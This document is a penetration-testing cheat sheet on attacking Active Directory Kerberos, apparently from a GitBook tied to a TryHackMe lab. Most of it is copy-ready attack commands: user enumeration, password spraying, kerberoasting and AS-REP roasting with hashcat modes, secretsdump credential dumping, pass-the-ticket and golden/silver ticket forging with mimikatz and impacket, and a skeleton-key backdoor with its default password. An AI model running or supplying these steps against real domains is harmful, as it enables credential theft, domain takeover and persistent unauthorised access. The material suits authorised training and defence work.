# kerberos 101

## Kerberos Authentication

![](../.gitbook/assets/kerberos-auth.png)

### Enumerating Users using [Kerbrute](https://github.com/ropnop/kerbrute/releases)

```bash
./kerbrute -dc DC_IP -d DOMAIN USER.txt -t 50
```

### Harvesting TGTs using [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

```bash
Rubeus.exe harvest /interval:30

# password spray 
Rubeus.exe brute /password:Password1 /noticket
```

### kerberoasting

Allows user to request service ticket (ST) for any service w/ registered SPN (service princical name) then use the ST to
crack service password.

* [Bloodhound](https://github.com/BloodHoundAD/BloodHound/releases)
* [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)
* [kekeo](https://github.com/gentilkiwi/kekeo)

```bash
# using Rubeus.exe
Rubeus.exe kerberoast

# dump the Kerberos hash for all kerberoastable accounts
impacket-GetUserSPNs DOMAIN.com/USER:'PASS' -dc-ip DC_IP -request
hashcat -m 13100
```

* If the service account is domain admin > Golden/Silver ticket > dumping the NTDS.dit.
* If the service account is not domain admin > log into system with creds > pivot/escalate > password spray other
  service and domain admin accounts

### AS-REP Roasting | (only for users with Kerberos pre-authentication disabled)

* Dumps the krbasrep5 hashes of user accounts
* If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an
  encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who
  they say that they are.
* This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the
  specified user account.

```bash
# using Rubeus.exe
Rubeus.exe asreproast
# add $23 after $krb5asrep$
# hashcat -m 18200

# Impacket's GetNPUsers.py
# Enumerate the users > user.txt
impacket-GetNPUsers DOMAIN/ -usersfile user.txt [-format hashcat] [-outputfile hash]
impacket-GetNPUsers DOMAIN/USER -no-pass -dc-ip IP [-format hashcat]
impacket-GetNPUsers -dc-ip IP -request DOMAIN/
# hashcat -m 18200

secretsdump.py USER@DOMAIN-IP
```

### Pass-the-ticket using mimikatz

* Can be used for dumping user credentials inside an AD network
* Can dump the TGT from the LSASS memory (which stores Kerberos ticket as the gatekeeper and accept or reject the
  credentials provided)
* Gives a .kirbi ticket - can be used to get domain admin
* Allows to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket

```bash
# exports all .kirbi to current directory
sekurlsa::tickets /export

# find some admin .kirbi from krbtgt
kerberos::ptt TICKET

# to check if ticket is working
> klist
```

### Golden / Silver ticket attack using mimikatz

* Silver ticket => more stealth and discreet; only for target service
* Golden ticket => any kerberos service

NOTE:

* **KRBTGT:** service account in KDC; issues all TGTs. If impersonate this account and create a golden ticket we have
  ability to create a service ticket for any service
* **TGT:** ticket to a service account issued by the KDC and can only access that service.

#### Golden Ticket

```bash
# dump hash and SID
lsadump::lsa /inject /name: krbtgt

# create ticket golden
kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:500

# open a new elevated command prompt with the given ticket in mimikatz.
misc::cmd
```

```bash
impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid DOMAIN_SID -domain FQDN_DOMAIN USER
export KRB5CCNAME=FILE.cache
impacket-psexec DOMAIN/USER@DOMAIN -k -no-pass
```

#### Silver Ticket

```bash
# dump
lsadump::lsa /inject /name: [<domain-admin-account> | <service-account>]

# create ticket silver
kerberos::golden /user:<USER> /domain:DOMAINM /sid:SID /krbtgt:SERVICE_NTLM_hash /id:1103

# open a new elevated command prompt with the given ticket in mimikatz.
misc::cmd
```

### Kerberos backdoor using mimikatz

* Works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps.
* A skeleton key only works using Kerberos RC4 encryption.
* The default hash skeleton key is `60BA4FCADC466C7A033C178194C03DF6` (password:`mimikatz`)

```bash
misc::skeleton

# done, now accessing admin share
> net use C:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
> dir \\Desktop-1\c$ /user:Machine1 mimikatz
```

## References

* [TryHackMe:attackingkerberos](https://tryhackme.com/room/attackingkerberos)
* [Kerberos Authentication Image](https://www.manageengine.com/products/active-directory-audit/kb/windows-security-log-event-id-4768.html)